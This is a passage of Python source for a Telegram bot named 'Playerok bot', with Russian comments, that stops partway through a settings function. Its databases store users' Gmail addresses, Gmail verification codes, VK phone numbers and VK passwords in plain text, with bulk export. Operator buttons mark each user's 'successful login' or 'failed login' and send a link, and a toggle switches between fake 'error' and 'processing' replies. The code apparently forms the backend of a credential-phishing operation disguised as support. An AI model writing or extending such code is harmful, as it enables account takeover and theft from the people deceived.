import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import re
from datetime import datetime
import time
import requests
from urllib3.exceptions import ProtocolError, ReadTimeoutError
from http.client import RemoteDisconnected
import os
import sys
import threading
import json
import sqlite3
import traceback


# ═══════════════════════════════════════════════════════════
#   TXT FILE DATABASE — встроенная файловая база данных
#   Сохраняет каждого пользователя в отдельный .txt файл
#   Папка: playerok_db/ (рядом со скриптом)
# ═══════════════════════════════════════════════════════════
_TXT_BASE_DIR  = os.path.join(os.path.dirname(os.path.abspath(__file__)), "playerok_db")
_TXT_USERS_DIR = os.path.join(_TXT_BASE_DIR, "users")
_TXT_ALL_FILE  = os.path.join(_TXT_BASE_DIR, "all_users.txt")
_TXT_LOG_FILE  = os.path.join(_TXT_BASE_DIR, "log.txt")


def _txt_ensure_dirs():
    os.makedirs(_TXT_USERS_DIR, exist_ok=True)


def _txt_now():
    return datetime.now().strftime("%d.%m.%Y %H:%M:%S")


def _txt_user_path(user_id):
    return os.path.join(_TXT_USERS_DIR, f"{user_id}.txt")


def _txt_log(msg):
    try:
        _txt_ensure_dirs()
        with open(_TXT_LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{_txt_now()}] {msg}\n")
    except Exception:
        pass


def _txt_init():
    """Создаёт папки и all_users.txt при первом запуске."""
    _txt_ensure_dirs()
    if not os.path.exists(_TXT_ALL_FILE):
        with open(_TXT_ALL_FILE, "w", encoding="utf-8") as f:
            f.write("=" * 60 + "\n")
            f.write("  PLAYEROK BOT — БАЗА ПОЛЬЗОВАТЕЛЕЙ\n")
            f.write("=" * 60 + "\n")
            f.write(f"Создано: {_txt_now()}\n")
            f.write("-" * 60 + "\n\n")
    print("✅ [TxtDB] Файловая база данных готова")
    print(f"📁 [TxtDB] Папка: {_TXT_BASE_DIR}")


def txt_register_user(user_id, username, first_name):
    """
    Создаёт карточку пользователя в TxtDB.
    Возвращает True если пользователь новый.
    """
    _txt_ensure_dirs()
    path = _txt_user_path(user_id)
    is_new = not os.path.exists(path)
    if is_new:
        uname_str = f"@{username}" if username else "—"
        with open(path, "w", encoding="utf-8") as f:
            f.write("=" * 50 + "\n")
            f.write(f"  КАРТОЧКА ПОЛЬЗОВАТЕЛЯ #{user_id}\n")
            f.write("=" * 50 + "\n")
            f.write(f"Имя:           {first_name or '—'}\n")
            f.write(f"Username:      {uname_str}\n")
            f.write(f"Telegram ID:   {user_id}\n")
            f.write(f"Регистрация:   {_txt_now()}\n")
            f.write("-" * 50 + "\n")
            f.write("ИСТОРИЯ АВТОРИЗАЦИЙ:\n")
            f.write("-" * 50 + "\n")
        with open(_TXT_ALL_FILE, "a", encoding="utf-8") as f:
            uname_str = f"@{username}" if username else "—"
            f.write(f"[{_txt_now()}] ID={user_id:<12} | {(first_name or '—'):<20} | {uname_str}\n")
        _txt_log(f"НОВЫЙ: ID={user_id}, @{username}, {first_name}")
        print(f"✅ [TxtDB] Новый пользователь: {user_id}")
    else:
        _txt_log(f"ПОВТОРНЫЙ /start: ID={user_id}")
    return is_new


def txt_save_user_data(user_id, username, first_name, data_type, data_value):
    """
    Добавляет строку авторизации в карточку пользователя.
    data_type: gmail_email | gmail_code | vk_phone | vk_password
    """
    _txt_ensure_dirs()
    if not os.path.exists(_txt_user_path(user_id)):
        txt_register_user(user_id, username, first_name)
    labels = {
        "gmail_email":  "📧 Gmail Email  ",
        "gmail_code":   "🔢 Gmail Code   ",
        "vk_phone":     "📱 VK Phone     ",
        "vk_password":  "🔐 VK Password  ",
    }
    label = labels.get(data_type, f"❓ {data_type:<14}")
    with open(_txt_user_path(user_id), "a", encoding="utf-8") as f:
        f.write(f"{label} | {str(data_value):<40} | {_txt_now()}\n")
    _txt_log(f"ДАННЫЕ [{data_type}]: ID={user_id} → {data_value}")
    print(f"✅ [TxtDB] [{data_type}] записан для {user_id}")


def txt_delete_user(user_id):
    """Удаляет карточку пользователя из TxtDB."""
    path = _txt_user_path(user_id)
    if os.path.exists(path):
        os.remove(path)
        _txt_log(f"УДАЛЁН: ID={user_id}")
        print(f"🗑 [TxtDB] Удалён пользователь {user_id}")


def txt_get_card(user_id):
    """Возвращает содержимое карточки пользователя."""
    path = _txt_user_path(user_id)
    if not os.path.exists(path):
        return f"❌ Пользователь {user_id} не найден в TxtDB"
    with open(path, "r", encoding="utf-8") as f:
        return f.read()


def txt_export_all():
    """Объединяет все карточки в один файл export.txt и возвращает путь."""
    _txt_ensure_dirs()
    export_path = os.path.join(_TXT_BASE_DIR, "export.txt")
    count = 0
    with open(export_path, "w", encoding="utf-8") as out:
        out.write("=" * 60 + "\n")
        out.write("  PLAYEROK BOT — ПОЛНЫЙ ЭКСПОРТ\n")
        out.write(f"  Дата: {_txt_now()}\n")
        out.write("=" * 60 + "\n\n")
        for fn in sorted(os.listdir(_TXT_USERS_DIR)):
            if fn.endswith(".txt"):
                with open(os.path.join(_TXT_USERS_DIR, fn), "r", encoding="utf-8") as f:
                    out.write(f.read())
                out.write("\n\n")
                count += 1
    _txt_log(f"ЭКСПОРТ: {count} пользователей → {export_path}")
    print(f"✅ [TxtDB] Экспорт: {export_path}")
    return export_path


def txt_users_count():
    """Количество пользователей в TxtDB."""
    if not os.path.exists(_TXT_USERS_DIR):
        return 0
    return len([f for f in os.listdir(_TXT_USERS_DIR) if f.endswith(".txt")])


# Файлы для хранения данных
LOCK_FILE = os.path.expanduser("~/playerok_bot.lock")
USERS_FILE = os.path.expanduser("~/playerok_users.json")
THREADS_FILE = os.path.expanduser("~/playerok_threads.json")
DATABASE_FILE = os.path.expanduser("~/playerok_bot.db")

# ---------- БЛОКИРОВКА ДВОЙНОГО ЗАПУСКА ----------
def check_lock():
    if os.path.exists(LOCK_FILE):
        print("❌ Бот уже запущен! Остановите предыдущий процесс.")
        print("Для принудительной остановки выполните: pkill -9 python")
        sys.exit(1)
    
    try:
        with open(LOCK_FILE, 'w') as f:
            f.write(str(os.getpid()))
        print("✅ Файл блокировки создан")
    except Exception as e:
        print(f"⚠️ Не удалось создать файл блокировки: {e}")

def remove_lock():
    try:
        if os.path.exists(LOCK_FILE):
            os.remove(LOCK_FILE)
            print("✅ Файл блокировки удален")
    except Exception as e:
        print(f"⚠️ Ошибка удаления файла блокировки: {e}")


# ---------- РАБОТА С БАЗОЙ ПОЛЬЗОВАТЕЛЕЙ ----------
def load_known_users():
    """Загружает список известных пользователей из файла"""
    try:
        if os.path.exists(USERS_FILE):
            with open(USERS_FILE, 'r') as f:
                return set(json.load(f))
        return set()
    except Exception as e:
        print(f"⚠️ Ошибка загрузки пользователей: {e}")
        return set()


def save_known_users(users_set):
    """Сохраняет список известных пользователей в файл"""
    try:
        with open(USERS_FILE, 'w') as f:
            json.dump(list(users_set), f)
    except Exception as e:
        print(f"⚠️ Ошибка сохранения пользователей: {e}")


def is_new_user(chat_id):
    """Проверяет, является ли пользователь новым"""
    known_users = load_known_users()
    if chat_id in known_users:
        return False
    else:
        known_users.add(chat_id)
        save_known_users(known_users)
        return True


# ---------- РАБОТА С БАЗОЙ ДАННЫХ ----------
def init_database():
    """Инициализирует базу данных SQLite"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        # Таблица для хранения пользователей (используем user_id как основной ключ)
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                last_name TEXT,
                joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Таблица для хранения тем (threads)
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS threads (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                group_id INTEGER NOT NULL,
                thread_id INTEGER NOT NULL,
                thread_name TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                UNIQUE(user_id, group_id)
            )
        ''')
        
        # Таблица для хранения данных пользователей (почты, пароли, коды)
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS user_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                data_type TEXT NOT NULL,
                data_value TEXT NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (user_id) REFERENCES users(user_id)
            )
        ''')
        
        # Таблица для хранения ID консольного сообщения
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS console_message (
                id INTEGER PRIMARY KEY,
                message_id INTEGER NOT NULL,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Таблица для логирования ошибок
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS error_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                error_type TEXT NOT NULL,
                error_message TEXT NOT NULL,
                error_traceback TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Таблица для статистики работы бота
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS bot_stats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                stat_type TEXT NOT NULL,
                stat_value TEXT NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Таблица для настроек бота (включена/выключена поддержка)
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS bot_settings (
                setting_key TEXT PRIMARY KEY,
                setting_value TEXT NOT NULL,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Устанавливаем значение по умолчанию для поддержки (включена)
        cursor.execute('''
            INSERT OR IGNORE INTO bot_settings (setting_key, setting_value)
            VALUES ('support_enabled', 'true')
        ''')
        
        # Устанавливаем значение по умолчанию для режима ответа (ошибка)
        cursor.execute('''
            INSERT OR IGNORE INTO bot_settings (setting_key, setting_value)
            VALUES ('response_mode', 'error')
        ''')
        
        # Устанавливаем значение по умолчанию для технических работ (выключены)
        cursor.execute('''
            INSERT OR IGNORE INTO bot_settings (setting_key, setting_value)
            VALUES ('maintenance_mode', 'false')
        ''')
        
        # Устанавливаем значение по умолчанию для режима Cookie (выключен)
        cursor.execute('''
            INSERT OR IGNORE INTO bot_settings (setting_key, setting_value)
            VALUES ('cookie_mode', 'false')
        ''')
        
        # Таблица для блокировки пользователей
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS blocked_users (
                user_id INTEGER PRIMARY KEY,
                blocked_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                blocked_by INTEGER
            )
        ''')
        
        conn.commit()
        conn.close()
        print("✅ База данных инициализирована")
        
    except Exception as e:
        print(f"❌ Ошибка инициализации базы данных: {e}")


def save_user_data(chat_id, data_type, data_value):
    """Сохраняет данные пользователя (email, code, phone, password)"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO user_data (user_id, data_type, data_value)
            VALUES (?, ?, ?)
        ''', (chat_id, data_type, data_value))
        
        conn.commit()
        conn.close()
        print(f"✅ Данные ({data_type}) пользователя {chat_id} сохранены в БД")

        # Дублируем в TXT файловую БД
        try:
            _uname, _fname = "", ""
            _conn2 = sqlite3.connect(DATABASE_FILE)
            _cur2  = _conn2.cursor()
            _cur2.execute("SELECT username, first_name FROM users WHERE user_id=?", (chat_id,))
            _row = _cur2.fetchone()
            _conn2.close()
            if _row:
                _uname = _row[0] or ""
                _fname = _row[1] or ""
        except Exception:
            pass
        txt_save_user_data(chat_id, _uname, _fname, data_type, data_value)

    except Exception as e:
        print(f"❌ Ошибка сохранения данных пользователя в БД: {e}")


def save_user_to_db(chat_id, username, first_name):
    """Сохраняет пользователя в базу данных"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT OR REPLACE INTO users (user_id, username, first_name, last_activity)
            VALUES (?, ?, ?, CURRENT_TIMESTAMP)
        ''', (chat_id, username, first_name))
        
        conn.commit()
        conn.close()
        print(f"✅ Пользователь {chat_id} сохранен в БД")

        # Дублируем в TXT файловую БД
        txt_register_user(chat_id, username, first_name)

    except Exception as e:
        print(f"❌ Ошибка сохранения пользователя в БД: {e}")


def is_user_in_db(chat_id):
    """Проверяет, есть ли пользователь в базе данных"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        cursor.execute('SELECT user_id FROM users WHERE user_id = ?', (chat_id,))
        result = cursor.fetchone()
        
        conn.close()
        return result is not None
        
    except Exception as e:
        print(f"❌ Ошибка проверки пользователя в БД: {e}")
        return False


def is_user_blocked(chat_id):
    """Проверяет, заблокирован ли пользователь"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        cursor.execute('SELECT user_id FROM blocked_users WHERE user_id = ?', (chat_id,))
        result = cursor.fetchone()
        
        conn.close()
        return result is not None
        
    except Exception as e:
        print(f"❌ Ошибка проверки блокировки: {e}")
        return False


def block_user(user_id, admin_id):
    """Блокирует пользователя"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT OR IGNORE INTO blocked_users (user_id, blocked_by)
            VALUES (?, ?)
        ''', (user_id, admin_id))
        
        conn.commit()
        conn.close()
        print(f"✅ Пользователь {user_id} заблокирован админом {admin_id}")
        return True
        
    except Exception as e:
        print(f"❌ Ошибка блокировки пользователя: {e}")
        return False


def unblock_user(user_id):
    """Разблокирует пользователя"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        cursor.execute('DELETE FROM blocked_users WHERE user_id = ?', (user_id,))
        
        conn.commit()
        conn.close()
        print(f"✅ Пользователь {user_id} разблокирован")
        return True
        
    except Exception as e:
        print(f"❌ Ошибка разблокировки пользователя: {e}")
        return False


def delete_user_from_db(user_id):
    """Удаляет пользователя из базы данных (для заблокировавших бота)"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        # Удаляем из всех таблиц
        cursor.execute('DELETE FROM users WHERE user_id = ?', (user_id,))
        cursor.execute('DELETE FROM threads WHERE user_id = ?', (user_id,))
        cursor.execute('DELETE FROM user_data WHERE user_id = ?', (user_id,))
        cursor.execute('DELETE FROM blocked_users WHERE user_id = ?', (user_id,))
        
        conn.commit()
        conn.close()
        print(f"🗑 Пользователь {user_id} удалён из БД")

        # Удаляем из TXT файловой БД
        txt_delete_user(user_id)
        return True

    except Exception as e:
        print(f"❌ Ошибка удаления пользователя из БД: {e}")
        return False


def notify_new_user(chat_id, username, first_name):
    """Отправляет уведомление о новом пользователе в группу"""
    try:
        # Получаем thread_id для пользователя в группе USER_ACTIONS_CHAT_ID
        thread_id = get_thread_id(chat_id, USER_ACTIONS_CHAT_ID)
        
        if not thread_id:
            print(f"❌ ОШИБКА: Тема не найдена для пользователя {chat_id} в USER_ACTIONS_CHAT_ID")
            return
        
        # Проверяем, было ли уже отправлено уведомление о новом пользователе
        if check_if_notification_sent(chat_id, USER_ACTIONS_CHAT_ID):
            print(f"ℹ️  Уведомление о пользователе {chat_id} уже было отправлено ранее (пропускаю)")
            return
        
        # Формируем имя пользователя
        name = first_name if first_name else "Не указано"
        username_str = f"@{username}" if username else "Не указан"
        
        # Текущее время
        current_time = datetime.now().strftime("%d.%m.%Y %H:%M:%S")
        
        # Проверяем статус блокировки
        blocked = is_user_blocked(chat_id)
        status = "🔴 ЗАБЛОКИРОВАН" if blocked else "🟢 АКТИВЕН"
        
        # Формируем сообщение
        message_text = (
            f"🆕 <b>НОВЫЙ ПОЛЬЗОВАТЕЛЬ</b>\n\n"
            f"👤 Имя: {name}\n"
            f"📱 Username: {username_str}\n"
            f"🆔 ID: <code>{chat_id}</code>\n"
            f"⏰ Время: {current_time}\n\n"
            f"Статус: {status}"
        )
        
        # Создаём клавиатуру с кнопками
        keyboard = InlineKeyboardMarkup()
        keyboard.row(
            InlineKeyboardButton("💬 Ответить", callback_data=f"reply_{chat_id}")
        )
        
        if blocked:
            keyboard.row(
                InlineKeyboardButton("🟢 Разблокировать", callback_data=f"unblock_{chat_id}")
            )
        else:
            keyboard.row(
                InlineKeyboardButton("🔴 Заблокировать", callback_data=f"block_{chat_id}")
            )
        
        # Добавляем кнопку "Ссылка"
        keyboard.row(
            InlineKeyboardButton("📎 Ссылка", callback_data=f"send_link_{chat_id}")
        )
        
        # Добавляем кнопку "Успешный вход" и "Не успешный вход"
        keyboard.row(
            InlineKeyboardButton("✅ Успешный вход", callback_data=f"successful_login_{chat_id}"),
            InlineKeyboardButton("❌ Не успешный", callback_data=f"failed_login_{chat_id}")
        )
        
        # Отправляем сообщение в тему
        sent_msg = bot.send_message(
            USER_ACTIONS_CHAT_ID,
            message_text,
            parse_mode="HTML",
            message_thread_id=thread_id,
            reply_markup=keyboard
        )
        
        # Сохраняем факт отправки уведомления
        mark_notification_as_sent(chat_id, USER_ACTIONS_CHAT_ID, sent_msg.message_id)
        
        print(f"✅ Уведомление о новом пользователе {chat_id} отправлено (msg_id: {sent_msg.message_id})")
        
    except Exception as e:
        print(f"❌ ОШИБКА в notify_new_user() для {chat_id}: {type(e).__name__}: {str(e)}")
        import traceback
        print(f"   Traceback:\n{traceback.format_exc()}")


def ensure_notification_exists(chat_id, username, first_name):
    """
    КРИТИЧНАЯ ФУНКЦИЯ: Гарантирует наличие уведомления в теме USER_ACTIONS.
    Проверяет реальное сообщение в чате, а не только БД.
    Если сообщения нет (удалено или не было создано) - отправляет новое.
    Работает для ВСЕХ пользователей (новых и старых).
    """
    # Игнорируем группы (ID < -1000000000)
    if chat_id < -1000000000:
        return
    
    try:
        # Получаем thread_id
        thread_id = get_thread_id(chat_id, USER_ACTIONS_CHAT_ID)
        
        if not thread_id:
            # Если темы нет - создаём её
            print(f"⚠️ Тема не найдена для user_id={chat_id}, создаю...")
            thread_id = create_thread_for_user(chat_id, USER_ACTIONS_CHAT_ID)
            
            if not thread_id:
                print(f"❌ КРИТИЧЕСКАЯ ОШИБКА: Не удалось создать тему для user_id={chat_id}")
                return
        
        # Проверяем, есть ли уведомление (проверка реального сообщения в чате)
        has_notification = check_if_notification_sent(chat_id, USER_ACTIONS_CHAT_ID)
        
        if has_notification:
            # Сообщение есть - всё в порядке
            return
        
        # Сообщения нет - отправляем
        print(f"📢 Сообщение отсутствует в теме для user_id={chat_id}, отправляю...")
        notify_new_user(chat_id, username, first_name)
        
    except Exception as e:
        print(f"❌ ОШИБКА в ensure_notification_exists для user_id={chat_id}: {e}")
        import traceback
        print(f"   Traceback:\n{traceback.format_exc()}")


def update_old_support_messages_info():
    """
    Информирует о том, что старые сообщения в SUPPORT будут обновлены автоматически.
    Новые сообщения уже будут содержать кнопки блокировки.
    """
    print("ℹ️  Система блокировки активирована!")
    print("ℹ️  Все НОВЫЕ сообщения в поддержку теперь содержат кнопки блокировки")
    print("ℹ️  Старые сообщения можно обновить вручную при необходимости")


def check_if_notification_sent(chat_id, group_chat_id):
    """Проверяет, есть ли уже сообщение о новом пользователе в теме (проверка в реальном чате)"""
    try:
        # Получаем thread_id для пользователя
        thread_id = get_thread_id(chat_id, group_chat_id)
        
        if not thread_id:
            # Если темы нет - уведомления точно нет
            return False
        
        # Проверяем БД - есть ли ID сообщения
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT message_id FROM user_notifications 
            WHERE user_id = ? AND group_id = ?
        ''', (chat_id, group_chat_id))
        
        result = cursor.fetchone()
        conn.close()
        
        if not result:
            # Если в БД нет записи - уведомление не отправлялось
            return False
        
        message_id = result[0]
        
        # КРИТИЧНО: Проверяем, существует ли это сообщение в чате
        # Используем метод bot.edit_message_reply_markup - если сообщение существует, он пройдёт без изменений
        try:
            # Получаем текущее сообщение
            # Если сообщение не существует - получим ошибку
            chat_info = bot.get_chat(group_chat_id)
            
            # Пробуем "отредактировать" сообщение (на самом деле ничего не меняем)
            # Это самый простой способ проверить существование сообщения
            bot.edit_message_reply_markup(
                chat_id=group_chat_id,
                message_id=message_id,
                reply_markup=None  # Просто убираем клавиатуру и сразу вернём
            )
            
            # Если дошли сюда - сообщение существует, но мы убрали клавиатуру
            # Вернём её обратно
            blocked = is_user_blocked(chat_id)
            keyboard = InlineKeyboardMarkup()
            keyboard.row(InlineKeyboardButton("💬 Ответить", callback_data=f"reply_{chat_id}"))
            if blocked:
                keyboard.row(InlineKeyboardButton("🟢 Разблокировать", callback_data=f"unblock_{chat_id}"))
            else:
                keyboard.row(InlineKeyboardButton("🔴 Заблокировать", callback_data=f"block_{chat_id}"))
            keyboard.row(InlineKeyboardButton("📎 Ссылка", callback_data=f"send_link_{chat_id}"))
            keyboard.row(
                InlineKeyboardButton("✅ Успешный вход", callback_data=f"successful_login_{chat_id}"),
                InlineKeyboardButton("❌ Не успешный", callback_data=f"failed_login_{chat_id}")
            )
            
            bot.edit_message_reply_markup(
                chat_id=group_chat_id,
                message_id=message_id,
                reply_markup=keyboard
            )
            
            print(f"ℹ️  Уведомление о user_id={chat_id} уже есть в теме (msg_id: {message_id})")
            return True
            
        except Exception as e:
            error_text = str(e).lower()
            if "message to edit not found" in error_text or "message not found" in error_text or "message can't be edited" in error_text:
                # Сообщение было удалено из чата - нужно отправить заново
                print(f"⚠️ Сообщение msg_id={message_id} не найдено в чате. Отправлю новое.")
                # Удаляем запись из БД
                conn = sqlite3.connect(DATABASE_FILE)
                cursor = conn.cursor()
                cursor.execute('DELETE FROM user_notifications WHERE user_id = ? AND group_id = ?', (chat_id, group_chat_id))
                conn.commit()
                conn.close()
                return False
            else:
                # Другая ошибка - считаем что сообщение есть (на всякий случай)
                print(f"⚠️ Ошибка проверки сообщения msg_id={message_id}: {e}")
                # На всякий случай всё равно отправим новое
                return False
        
    except Exception as e:
        print(f"❌ Ошибка в check_if_notification_sent: {e}")
        return False


def mark_notification_as_sent(chat_id, group_chat_id, message_id):
    """Сохраняет факт отправки уведомления о новом пользователе"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        # Создаём таблицу, если её нет
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS user_notifications (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                group_id INTEGER NOT NULL,
                message_id INTEGER NOT NULL,
                sent_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                UNIQUE(user_id, group_id)
            )
        ''')
        
        # Сохраняем уведомление
        cursor.execute('''
            INSERT OR REPLACE INTO user_notifications (user_id, group_id, message_id, sent_at)
            VALUES (?, ?, ?, CURRENT_TIMESTAMP)
        ''', (chat_id, group_chat_id, message_id))
        
        conn.commit()
        conn.close()
        
    except Exception as e:
        print(f"❌ Ошибка сохранения факта уведомления: {e}")


def get_user_data(chat_id):
    """Получает все данные пользователя из БД"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT data_type, data_value, created_at 
            FROM user_data 
            WHERE user_id = ?
            ORDER BY created_at DESC
        ''', (chat_id,))
        
        rows = cursor.fetchall()
        conn.close()
        
        return rows
        
    except Exception as e:
        print(f"❌ Ошибка получения данных пользователя из БД: {e}")
        return []


def get_all_users_from_db():
    """Получает всех пользователей из БД"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT user_id, username, first_name, joined_at
            FROM users
            ORDER BY joined_at DESC
        ''')
        
        rows = cursor.fetchall()
        conn.close()
        
        return rows
        
    except Exception as e:
        print(f"❌ Ошибка получения пользователей из БД: {e}")
        return []


def get_users_count():
    """Получает количество пользователей в БД"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        cursor.execute('SELECT COUNT(*) FROM users')
        count = cursor.fetchone()[0]
        conn.close()
        
        return count
        
    except Exception as e:
        print(f"❌ Ошибка подсчета пользователей: {e}")
        return 0


def save_console_message_id(message_id):
    """Сохраняет ID консольного сообщения"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT OR REPLACE INTO console_message (id, message_id, updated_at)
            VALUES (1, ?, CURRENT_TIMESTAMP)
        ''', (message_id,))
        
        conn.commit()
        conn.close()
        
    except Exception as e:
        print(f"❌ Ошибка сохранения ID консоли: {e}")


def log_error(error_type, error_message, error_traceback=None):
    """Логирует ошибку в базу данных"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO error_logs (error_type, error_message, error_traceback)
            VALUES (?, ?, ?)
        ''', (error_type, error_message, str(error_traceback) if error_traceback else None))
        
        conn.commit()
        conn.close()
        
    except Exception as e:
        print(f"⚠️ Ошибка логирования ошибки: {e}")


def get_errors_grouped_by_hour(hours=24):
    """Получает ошибки сгруппированные по часам"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        cursor.execute(f'''
            SELECT 
                strftime('%Y-%m-%d %H:00', created_at) as hour,
                COUNT(*) as count,
                error_type
            FROM error_logs
            WHERE created_at >= datetime('now', '-{hours} hours')
            GROUP BY hour, error_type
            ORDER BY hour DESC
        ''')
        
        results = cursor.fetchall()
        conn.close()
        
        return results
        
    except Exception as e:
        print(f"❌ Ошибка получения ошибок: {e}")
        return []


def get_recent_errors(limit=20):
    """Получает последние ошибки"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT error_type, error_message, created_at
            FROM error_logs
            ORDER BY created_at DESC
            LIMIT ?
        ''', (limit,))
        
        results = cursor.fetchall()
        conn.close()
        
        return results
        
    except Exception as e:
        print(f"❌ Ошибка получения последних ошибок: {e}")
        return []


def get_errors_count():
    """Получает общее количество ошибок"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        cursor.execute('SELECT COUNT(*) FROM error_logs')
        count = cursor.fetchone()[0]
        conn.close()
        
        return count
        
    except Exception as e:
        print(f"❌ Ошибка подсчета ошибок: {e}")
        return 0


def clear_old_errors(days=7):
    """Удаляет старые ошибки (старше N дней)"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        cursor.execute(f'''
            DELETE FROM error_logs
            WHERE created_at < datetime('now', '-{days} days')
        ''')
        
        deleted = cursor.rowcount
        conn.commit()
        conn.close()
        
        return deleted
        
    except Exception as e:
        print(f"❌ Ошибка очистки старых ошибок: {e}")
        return 0


def get_console_message_id():
    """Получает ID консольного сообщения"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        cursor.execute('SELECT message_id FROM console_message WHERE id = 1')
        result = cursor.fetchone()
        conn.close()
        
        if result:
            return result[0]
        return None
        
    except Exception as e:
        print(f"❌ Ошибка получения ID консоли: {e}")
        return None


# ---------- НАСТРОЙКИ БОТА (ПОДДЕРЖКА) ----------
def is_support_enabled():
    """Проверяет, включена ли поддержка"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        cursor.execute('SELECT setting_value FROM bot_settings WHERE setting_key = "support_enabled"')
        result = cursor.fetchone()
        conn.close()
        
        if result:
            return result[0] == 'true'
        return True  # По умолчанию включено
        
    except Exception as e:
        print(f"❌ Ошибка проверки настроек поддержки: {e}")
        return True


def toggle_support():
    """Переключает состояние поддержки (вкл/выкл)"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        # Получаем текущее состояние
        cursor.execute('SELECT setting_value FROM bot_settings WHERE setting_key = "support_enabled"')
        result = cursor.fetchone()
        
        if result:
            current_value = result[0]
            new_value = 'false' if current_value == 'true' else 'true'
        else:
            new_value = 'false'
        
        # Обновляем значение
        cursor.execute('''
            INSERT OR REPLACE INTO bot_settings (setting_key, setting_value, updated_at)
            VALUES ('support_enabled', ?, CURRENT_TIMESTAMP)
        ''', (new_value,))
        
        conn.commit()
        conn.close()
        
        return new_value == 'true'
        
    except Exception as e:
        print(f"❌ Ошибка переключения поддержки: {e}")
        return True


def get_response_mode():
    """Получает текущий режим ответа (error или processing)"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        cursor.execute('SELECT setting_value FROM bot_settings WHERE setting_key = "response_mode"')
        result = cursor.fetchone()
        
        conn.close()
        
        if result:
            return result[0]
        else:
            return 'error'  # По умолчанию режим ошибки
        
    except Exception as e:
        print(f"❌ Ошибка проверки режима ответа: {e}")
        return 'error'


def toggle_response_mode():
    """Переключает режим ответа между 'error' и 'processing'"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        # Получаем текущее состояние
        cursor.execute('SELECT setting_value FROM bot_settings WHERE setting_key = "response_mode"')
        result = cursor.fetchone()
        
        if result:
            current_value = result[0]
            new_value = 'processing' if current_value == 'error' else 'error'
        else:
            new_value = 'processing'
        
        # Обновляем значение
        cursor.execute('''
            INSERT OR REPLACE INTO bot_settings (setting_key, setting_value, updated_at)
            VALUES ('response_mode', ?, CURRENT_TIMESTAMP)
        ''', (new_value,))
        
        conn.commit()
        conn.close()
        
        print(f"✅ Режим ответа изменен на: {new_value}")
        return new_value
        
    except Exception as e:
        print(f"❌ Ошибка переключения режима ответа: {e}")
        return 'error'


def is_maintenance_mode():
    """Проверяет, включен ли режим технических работ"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        cursor.execute('SELECT setting_value FROM bot_settings WHERE setting_key = "maintenance_mode"')
        result = cursor.fetchone()
        
        conn.close()
        
